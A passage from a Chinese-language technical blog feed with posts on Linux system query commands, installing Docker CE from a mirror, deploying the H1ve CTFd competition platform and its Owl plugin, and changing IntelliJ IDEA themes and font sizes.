bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">lsusb  <span class="hljs-comment">#</span><br>加参数 -v 可以显示USB设备的描述表（descriptors）<br>lsusb -v<br></code></pre></div></td></tr></table></figure><h2 id="5-查看网卡状态"><a href="#5-查看网卡状态" class="headerlink" title="5.查看网卡状态"></a>5.查看网卡状态</h2><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">sudo apt-get install ethtool <br>sudo ethtool eth0<br></code></pre></div></td></tr></table></figure><h2 id="6-获取CPU序列号或者主板序列号"><a href="#6-获取CPU序列号或者主板序列号" class="headerlink" title="6.获取CPU序列号或者主板序列号"></a>6.获取CPU序列号或者主板序列号</h2><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-comment">#CPU IDsudo dmidecode -t 4 | grep ID</span><br><span class="hljs-comment">#Serial Number</span><br>sudo dmidecode  | grep  Serial<br><span class="hljs-comment">#CPUsudo dmidecode -t 4</span><br><span class="hljs-comment">#BIOS</span><br>sudo dmidecode -t 0<br><span class="hljs-comment">#主板：</span><br>sudo dmidecode -t 2<br><span class="hljs-comment">#OEM:</span><br>sudo dmidecode -t 11<br></code></pre></div></td></tr></table></figure><h2 id="7-查看已经安装了的包"><a href="#7-查看已经安装了的包" class="headerlink" title="7.查看已经安装了的包"></a>7.查看已经安装了的包</h2><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">dpkg -l<br></code></pre></div></td></tr></table></figure><h2 id="8-根据IP查网卡地址"><a href="#8-根据IP查网卡地址" class="headerlink" title="8.根据IP查网卡地址"></a>8.根据IP查网卡地址</h2><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">arping IP地址<br></code></pre></div></td></tr></table></figure><h2 id="9-查看当前IP地址"><a href="#9-查看当前IP地址" class="headerlink" title="9.查看当前IP地址"></a>9.查看当前IP地址</h2><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">ifconfig eth0 |awk <span class="hljs-string">&#x27;/inet/ &#123;split($2,x,&quot;:&quot;);print x[2]&#125;&#x27;</span><br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Linux学习</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>CTFd-Docker-ce （Community Edition） 镜像使用帮助</title>
    <link href="/2021/05/23/CTFd/CTFd-Docker-ce%20%EF%BC%88Community%20Edition%EF%BC%89%20%E9%95%9C%E5%83%8F%E4%BD%BF%E7%94%A8%E5%B8%AE%E5%8A%A9/"/>
    <url>/2021/05/23/CTFd/CTFd-Docker-ce%20%EF%BC%88Community%20Edition%EF%BC%89%20%E9%95%9C%E5%83%8F%E4%BD%BF%E7%94%A8%E5%B8%AE%E5%8A%A9/</url>
    
    <content type="html"><![CDATA[<p>CTFd-DockerCE （Community Edition） 镜像使用帮助。<br><strong>注意: 本镜像只提供 Debian/Ubuntu/Fedora/CentOS/RHEL 的 docker 软件包，非 dockerhub。</strong></p><h1 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h1><h2 id="1-Debian-Ubuntu-用户"><a href="#1-Debian-Ubuntu-用户" class="headerlink" title="1.Debian/Ubuntu 用户"></a>1.Debian/Ubuntu 用户</h2><p>如果过去安装过 docker，应该先删掉:</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">sudo apt-get remove docker docker-engine docker.io<br></code></pre></div></td></tr></table></figure><p>然后需要安装依赖：</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">sudo apt-get install apt-transport-https ca-certificates curl gnupg2 software-properties-common<br></code></pre></div></td></tr></table></figure><h3 id="1-1-Ubuntu-用户"><a href="#1-1-Ubuntu-用户" class="headerlink" title="1.1 Ubuntu 用户"></a>1.1 Ubuntu 用户</h3><p>信任 Docker 的 GPG 公钥：</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add -<br></code></pre></div></td></tr></table></figure><p>对于 amd64 架构的计算机，添加软件仓库：</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">sudo add-apt-repository \<br>   <span class="hljs-string">&quot;deb [arch=amd64] https://mirrors.tuna.tsinghua.edu.cn/docker-ce/linux/ubuntu \</span><br><span class="hljs-string">   <span class="hljs-subst">$(lsb_release -cs)</span> \</span><br><span class="hljs-string">   stable&quot;</span><br></code></pre></div></td></tr></table></figure><p>如果是树莓派或其它ARM架构计算机，请运行:</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;deb [arch=armhf] https://mirrors.tuna.tsinghua.edu.cn/docker-ce/linux/ubuntu \</span><br><span class="hljs-string">     <span class="hljs-subst">$(lsb_release -cs)</span> stable&quot;</span> | \<br>    sudo tee /etc/apt/sources.list.d/docker.list<br></code></pre></div></td></tr></table></figure><p>最后再安装：</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">sudo apt-get update<br>sudo apt-get install docker-ce<br></code></pre></div></td></tr></table></figure><h3 id="1-2-Debian-用户"><a href="#1-2-Debian-用户" class="headerlink" title="1.2 Debian 用户"></a>1.2 Debian 用户</h3><p>信任 Docker 的 GPG 公钥：</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">curl -fsSL https://download.docker.com/linux/debian/gpg | sudo apt-key add -<br></code></pre></div></td></tr></table></figure><p>对于 amd64 架构的计算机，添加软件仓库：</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">sudo add-apt-repository \<br>   <span class="hljs-string">&quot;deb [arch=amd64] https://mirrors.tuna.tsinghua.edu.cn/docker-ce/linux/debian \</span><br><span class="hljs-string">   <span class="hljs-subst">$(lsb_release -cs)</span> \</span><br><span class="hljs-string">   stable&quot;</span><br></code></pre></div></td></tr></table></figure><p>如果是树莓派或其它ARM架构计算机，请运行:</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;deb [arch=armhf] https://mirrors.tuna.tsinghua.edu.cn/docker-ce/linux/debian \</span><br><span class="hljs-string">     <span class="hljs-subst">$(lsb_release -cs)</span> stable&quot;</span> | \<br>    sudo tee /etc/apt/sources.list.d/docker.list<br></code></pre></div></td></tr></table></figure><p>最后再安装：</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">sudo apt-get update<br>sudo apt-get install docker-ce<br></code></pre></div></td></tr></table></figure><h2 id="2-Fedora-CentOS-RHEL用户"><a href="#2-Fedora-CentOS-RHEL用户" class="headerlink" title="2.Fedora/CentOS/RHEL用户"></a>2.Fedora/CentOS/RHEL用户</h2><p>如果你之前安装过 docker，请先删掉：</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">sudo yum remove docker docker-common docker-selinux docker-engine<br></code></pre></div></td></tr></table></figure><p>安装依赖：</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">sudo yum install -y yum-utils device-mapper-persistent-data lvm2<br></code></pre></div></td></tr></table></figure><h3 id="2-1-Fedora-用户"><a href="#2-1-Fedora-用户" class="headerlink" title="2.1 Fedora 用户"></a>2.1 Fedora 用户</h3><p>下载repo文件:</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">wget -O /etc/yum.repos.d/docker-ce.repo https://download.docker.com/linux/fedora/docker-ce.repo<br></code></pre></div></td></tr></table></figure><p>把软件仓库地址替换为 TUNA:</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">sudo sed -i <span class="hljs-string">&#x27;s+download.docker.com+mirrors.tuna.tsinghua.edu.cn/docker-ce+&#x27;</span> /etc/yum.repos.d/docker-ce.repo<br></code></pre></div></td></tr></table></figure><p>最后安装:</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">sudo yum makecache fast<br>sudo yum install docker-ce<br></code></pre></div></td></tr></table></figure><h3 id="2-2-CentOS-RHEL-用户"><a href="#2-2-CentOS-RHEL-用户" class="headerlink" title="2.2 CentOS/RHEL 用户"></a>2.2 CentOS/RHEL 用户</h3><p>下载repo文件:</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">wget -O /etc/yum.repos.d/docker-ce.repo https://download.docker.com/linux/centos/docker-ce.repo<br></code></pre></div></td></tr></table></figure><p>把软件仓库地址替换为 TUNA:</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">sudo sed -i <span class="hljs-string">&#x27;s+download.docker.com+mirrors.tuna.tsinghua.edu.cn/docker-ce+&#x27;</span> /etc/yum.repos.d/docker-ce.repo<br></code></pre></div></td></tr></table></figure><p>最后安装:</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">sudo yum makecache fast<br>sudo yum install docker-ce<br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTFd</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>CTFd-Ubuntu20.4搭建H1ve平台</title>
    <link href="/2021/05/23/CTFd/CTFd-Ubuntu20.4%E6%90%AD%E5%BB%BAH1ve%20%E5%B9%B3%E5%8F%B0/"/>
    <url>/2021/05/23/CTFd/CTFd-Ubuntu20.4%E6%90%AD%E5%BB%BAH1ve%20%E5%B9%B3%E5%8F%B0/</url>
    
    <content type="html"><![CDATA[<p>CTFd-Ubuntu20.4搭建H1ve 平台。</p><h1 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h1><h2 id="1-下载一些依赖包"><a href="#1-下载一些依赖包" class="headerlink" title="1.下载一些依赖包"></a>1.下载一些依赖包</h2><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">sudo apt-get install -y yum-utils device-mapper-persistent-data lvm2 bind-utils<br></code></pre></div></td></tr></table></figure><h2 id="2-下载docker"><a href="#2-下载docker" class="headerlink" title="2.下载docker"></a>2.下载docker</h2><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">sudo apt-get install docker<br></code></pre></div></td></tr></table></figure><h2 id="3-下载docker-io"><a href="#3-下载docker-io" class="headerlink" title="3.下载docker.io"></a>3.下载docker.io</h2><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">sudo apt-get install docker.io<br></code></pre></div></td></tr></table></figure><h3 id="3-1-验证docker是否安装成功"><a href="#3-1-验证docker是否安装成功" class="headerlink" title="3.1 验证docker是否安装成功"></a>3.1 验证docker是否安装成功</h3><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">docker –version<br></code></pre></div></td></tr></table></figure><p>显示 Docker Version 19.03.8 ·········，表示成功。</p><h3 id="3-2-运行后报错"><a href="#3-2-运行后报错" class="headerlink" title="3.2 运行后报错"></a>3.2 运行后报错</h3><p>依赖: containerd.io (＞= 1.2.2-3) 但是它将不会被安装。</p><h4 id="解决方法（推荐方法2）"><a href="#解决方法（推荐方法2）" class="headerlink" title="解决方法（推荐方法2）"></a>解决方法（推荐方法2）</h4><h5 id="方法1"><a href="#方法1" class="headerlink" title="方法1"></a>方法1</h5><blockquote><ol><li>查看自己能安装的版本</li></ol></blockquote><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">apt-cache madison docker-ce<br></code></pre></div></td></tr></table></figure><blockquote><ol start="2"><li>安装指定版本</li></ol></blockquote><p>等号（=）后面为版本号。</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">sudo apt-get install docker-ce=17.12.0~ce-0~ubuntu<br></code></pre></div></td></tr></table></figure><blockquote><ol start="3"><li>查看是否成功</li></ol></blockquote><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">sudo docker run hello-world<br></code></pre></div></td></tr></table></figure><h5 id="方法2"><a href="#方法2" class="headerlink" title="方法2"></a>方法2</h5><p>参考《CTFd-Docker-ce （Community Edition） 镜像使用帮助》一文。</p><h2 id="4-安装docker-compose"><a href="#4-安装docker-compose" class="headerlink" title="4.安装docker-compose"></a>4.安装docker-compose</h2><h3 id="4-1-安装epel-release"><a href="#4-1-安装epel-release" class="headerlink" title="4.1 安装epel-release"></a>4.1 安装epel-release</h3><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">sudo apt-get install epel-release<br></code></pre></div></td></tr></table></figure><h3 id="4-2-安装python-pip"><a href="#4-2-安装python-pip" class="headerlink" title="4.2 安装python-pip"></a>4.2 安装python-pip</h3><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">sudo apt-get install python3-pip<br></code></pre></div></td></tr></table></figure><h3 id="4-3-安装docker-compose"><a href="#4-3-安装docker-compose" class="headerlink" title="4.3 安装docker-compose"></a>4.3 安装docker-compose</h3><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">sudo apt-get install docker-compose<br></code></pre></div></td></tr></table></figure><h3 id="4-4-验证是否安装成功"><a href="#4-4-验证是否安装成功" class="headerlink" title="4.4 验证是否安装成功"></a>4.4 验证是否安装成功</h3><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">docker-compose version<br></code></pre></div></td></tr></table></figure><p>出现 Docker version 19.03.8 ·····，表示成功。</p><h2 id="5-下载H1ve"><a href="#5-下载H1ve" class="headerlink" title="5.下载H1ve"></a>5.下载H1ve</h2><h3 id="5-1-下载git（有则跳过）"><a href="#5-1-下载git（有则跳过）" class="headerlink" title="5.1 下载git（有则跳过）"></a>5.1 下载git（有则跳过）</h3><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">sudo apt-get install git<br></code></pre></div></td></tr></table></figure><h3 id="5-2-下载h1ve项目"><a href="#5-2-下载h1ve项目" class="headerlink" title="5.2 下载h1ve项目"></a>5.2 下载h1ve项目</h3><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> http://github.com/D0g3-Lab/H1ve.git<br></code></pre></div></td></tr></table></figure><h2 id="6-开启Docker"><a href="#6-开启Docker" class="headerlink" title="6.开启Docker"></a>6.开启Docker</h2><p>首先进入H1ve：</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> H1ve<br></code></pre></div></td></tr></table></figure><h3 id="6-1-拉取镜像"><a href="#6-1-拉取镜像" class="headerlink" title="6.1 拉取镜像"></a>6.1 拉取镜像</h3><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">sudo docker-compose -f single.yml up &amp;<br></code></pre></div></td></tr></table></figure><h3 id="6-2-解决遇到的错误"><a href="#6-2-解决遇到的错误" class="headerlink" title="6.2 解决遇到的错误"></a>6.2 解决遇到的错误</h3><p><span style="color:red">ERROR：</span>Service ‘main’ failed to build: cannot normalize nothing</p><p>解决方案：</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-comment"># 添加docker用户组，一般已存在，不需要执行</span><br>sudo groupadd docker    <br><span class="hljs-comment"># 将登陆用户加入到docker用户组中</span><br>sudo gpasswd -a <span class="hljs-variable">$USER</span> docker<br><span class="hljs-comment"># 更新用户组</span><br>newgrp docker  <br></code></pre></div></td></tr></table></figure><h3 id="6-3-重启并开启"><a href="#6-3-重启并开启" class="headerlink" title="6.3 重启并开启"></a>6.3 重启并开启</h3><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">docker-compose -f single.yml down //关闭<br>docker-compose -f single.yml up //开启<br></code></pre></div></td></tr></table></figure><p>再在本地访问：http:127.0.0.1:8000 即可成功看见界面。</p><h2 id="7-H1ve-初次设置"><a href="#7-H1ve-初次设置" class="headerlink" title="7.H1ve 初次设置"></a>7.H1ve 初次设置</h2><p>第一次登入时的界面：</p><p><img src="https://img-blog.csdnimg.cn/20210523125953193.png"></p><p>其中，<br>CTF Name：平台的名称（登录之后也可以 admin -&gt; config 中更改）。<br>Admin Username、Admin Email、Admin Password、：设置管理员用户管理员。<br>CTF User Mode（Team Mode or User Mode)：平台的模式。</p><hr>]]></content>
    
    
    <categories>
      
      <category>CTFd</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>CTFd-H1ve-Owl设置</title>
    <link href="/2021/05/23/CTFd/CTFd-H1ve-Owl%E8%AE%BE%E7%BD%AE/"/>
    <url>/2021/05/23/CTFd/CTFd-H1ve-Owl%E8%AE%BE%E7%BD%AE/</url>
    
    <content type="html"><![CDATA[<p>CTFd-H1ve-Owl设置。包括插件设置、题目设置、自定义题目。</p><h1 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h1><h2 id="1-插件设置"><a href="#1-插件设置" class="headerlink" title="1.插件设置"></a>1.插件设置</h2><blockquote><ol><li>登录管理员账号之后点击上方的Admin即可进入管理页面。</li></ol></blockquote><p><img src="https://img-blog.csdnimg.cn/20210523131736243.png"></p><blockquote><ol start="2"><li>点击plugins-&gt;CTFd Owl进入Owl插件设置界面</li></ol></blockquote><p><img src="https://img-blog.csdnimg.cn/2021052313175525.png"></p><blockquote><ol start="3"><li>Docker Setting各项设置分别是：</li></ol></blockquote><ul><li>Docker Flag Prefix Flag前缀</li><li>Docker APIs URL API名字（默认为unix://var/run/docker.sock）</li><li>Max Container Count 最大容器数量（默认无限制）</li><li>Max Renewal Time 最大容器延长时间（超过将无法延长，达到时间后会自动摧毁）</li></ul><blockquote><ol start="4"><li>FRP Settings各项设置分别是：</li></ol></blockquote><ul><li>FRP Http Domain Suffix FRP域名前缀（如开启动态域名转发必填）</li><li>FRP Direct Ip Address FRP frp服务器IP</li><li>FRP Direct Minimum Port 最小端口</li><li>FRP Direct Maximum Port 最大端口</li><li>FRP Config Template Frpc热重载配置头模版(如不会自定义，尽量按照默认配置)</li></ul><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">[common]<br>token = random_this<br>server_addr = frps<br>server_port = 80<br>admin_addr = 0.0.0.0<br>admin_port = 7400<br></code></pre></div></td></tr></table></figure><p>简单实例设置</p><p><img src="https://img-blog.csdnimg.cn/2021052313181291.png"></p><p>(由于例子环境中没有绑定域名，所以Frp Http Domain Suffix就为空，Frp Direct IP Address 就直接用ip地址代替即可)</p><p><img src="https://img-blog.csdnimg.cn/20210523131828398.png"></p><h2 id="2-题目设置"><a href="#2-题目设置" class="headerlink" title="2.题目设置"></a>2.题目设置</h2><p>插件设置完成后，点击上方的Challenges，再点击下方的加号即可进入创建题目环境的设置页面</p><p><img src="https://img-blog.csdnimg.cn/20210523132146935.png"></p><blockquote><p>题目环境各项设置分别是：</p></blockquote><ul><li>Challenge Type 题目类型(选dynamic_check_docker)</li><li>Deployment Type 部署方式(选SINGLE-DOCKER-COMPOSE)</li><li>Dirname 题目所在文件夹（相对于source的相对路径）</li><li>FRP Type frp类型(DIRECT为ip直接访问，HTTP为域名访问)</li><li>FRP Port 题目内网端口(例子中为80)</li><li>Name 题目名称</li><li>Category 题目类别(WEB/MISC/RE/PWN/…)</li><li>Write&amp;Preview 题目介绍</li><li>Initial Value 题目最初分值</li><li>Decay Limit 题目分数达到最小值之前的解决数量</li><li>Minimum Value 题目最小分值</li></ul><p>简单例子设置如下：</p><p><img src="https://img-blog.csdnimg.cn/20210523132203571.png"></p><p><img src="https://img-blog.csdnimg.cn/20210523132220772.png"></p><h2 id="3-自定义题目"><a href="#3-自定义题目" class="headerlink" title="3.自定义题目"></a>3.自定义题目</h2><p>在H1ve/CTFd/plugins/ctfd-owl/source/test/目录下有一个题目例子(file-upl0ad)，编写Dockerfile参考例子即可。</p>]]></content>
    
    
    <categories>
      
      <category>CTFd</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>IDEA换自定义主题并设置字体大小</title>
    <link href="/2021/05/22/%E5%AE%9E%E7%94%A8%E5%B0%8F%E6%8A%80%E8%83%BD/IDEA%E6%8D%A2%E8%87%AA%E5%AE%9A%E4%B9%89%E4%B8%BB%E9%A2%98%E5%B9%B6%E8%AE%BE%E7%BD%AE%E5%AD%97%E4%BD%93%E5%A4%A7%E5%B0%8F/"/>
    <url>/2021/05/22/%E5%AE%9E%E7%94%A8%E5%B0%8F%E6%8A%80%E8%83%BD/IDEA%E6%8D%A2%E8%87%AA%E5%AE%9A%E4%B9%89%E4%B8%BB%E9%A2%98%E5%B9%B6%E8%AE%BE%E7%BD%AE%E5%AD%97%E4%BD%93%E5%A4%A7%E5%B0%8F/</url>
    
    <content type="html"><![CDATA[<p>IDEA换自定义主题并设置字体大小。</p><h1 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h1><h2 id="0-前提准备"><a href="#0-前提准备" class="headerlink" title="0.前提准备"></a>0.前提准备</h2><p>需要下载对应主题的 jar 包。这里放部分主题 jar 包。</p><blockquote><ol><li>Ladies Night 2</li></ol></blockquote><p>链接：<a href="https://pan.baidu.com/s/1XmJ4qFfrcTMUT9NAZoN5xw">https://pan.baidu.com/s/1XmJ4qFfrcTMUT9NAZoN5xw</a><br>提取码：f4hh </p><p><img src="https://img-blog.csdnimg.cn/20210522133151574.png"></p><blockquote><ol start="2"><li>Obsidian</li></ol></blockquote><p>链接：<a href="https://pan.baidu.com/s/1_nTw4jjYjAQt8baMBMX7YQ">https://pan.baidu.com/s/1_nTw4jjYjAQt8baMBMX7YQ</a><br>提取码：hmm8 </p><p><img src="https://img-blog.csdnimg.cn/20210522133207105.png"></p><blockquote><ol start="3"><li>RecognEyes</li></ol></blockquote><p>链接：<a href="https://pan.baidu.com/s/13taD-NPF4sVtVjQ-bCNkgg">https://pan.baidu.com/s/13taD-NPF4sVtVjQ-bCNkgg</a><br>提取码：f5bn </p><p><img src="https://img-blog.csdnimg.cn/20210522133222296.png"></p><blockquote><ol start="4"><li>Monokai Sublime Text 3</li></ol></blockquote><p>链接：<a href="https://pan.baidu.com/s/1JMlZva7IKeFKN7n4JE7htA">https://pan.baidu.com/s/1JMlZva7IKeFKN7n4JE7htA</a><br>提取码：4lfg </p><p><img src="https://img-blog.csdnimg.cn/20210522133237346.png"></p><hr><h2 id="1-导入"><a href="#1-导入" class="headerlink" title="1.导入"></a>1.导入</h2><blockquote><ol><li>首先打开 file -&gt; Import Settings，在弹出的窗口中再选择对应的主题 jar 包，再点击 OK 即可。</li></ol></blockquote><p><img src="https://img-blog.csdnimg.cn/20210522125735458.png"></p><h2 id="2-设置字体大小"><a href="#2-设置字体大小" class="headerlink" title="2.设置字体大小"></a>2.设置字体大小</h2><p><strong>设置自定义的主题的字体大小需要注意顺序！</strong></p><h3 id="2-1-默认主题的字体大小设置"><a href="#2-1-默认主题的字体大小设置" class="headerlink" title="2.1 默认主题的字体大小设置"></a>2.1 默认主题的字体大小设置</h3><blockquote><ol><li>打开 File -&gt; Settings -&gt; Editor -&gt; Font 再设置数字调整大小，再点击 Apply 和 OK 即可。如图。</li></ol></blockquote><p><img src="https://img-blog.csdnimg.cn/20210522130506455.png"></p><h3 id="2-2自定义主题的字体大小设置"><a href="#2-2自定义主题的字体大小设置" class="headerlink" title="2.2自定义主题的字体大小设置"></a>2.2自定义主题的字体大小设置</h3><p>使用上面的方法是没有作用的。</p><blockquote><ol><li>打开 File -&gt; Settings -&gt; Editor -&gt;Color Scheme ，再设置即可。如图。</li></ol></blockquote><p><img src="https://img-blog.csdnimg.cn/2021052213090891.png"></p>]]></content>
    
    
    <categories>
      
      <category>实用小技能</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>JAVA基础知识复习（十二）- JDBC</title>
    <link href="/2021/05/21/JAVA/JAVA%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%A4%8D%E4%B9%A0%EF%BC%88%E5%8D%81%E4%BA%8C%EF%BC%89-%20JDBC/"/>
    <url>/2021/05/21/JAVA/JAVA%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%A4%8D%E4%B9%A0%EF%BC%88%E5%8D%81%E4%BA%8C%EF%BC%89-%20JDBC/</url>
    
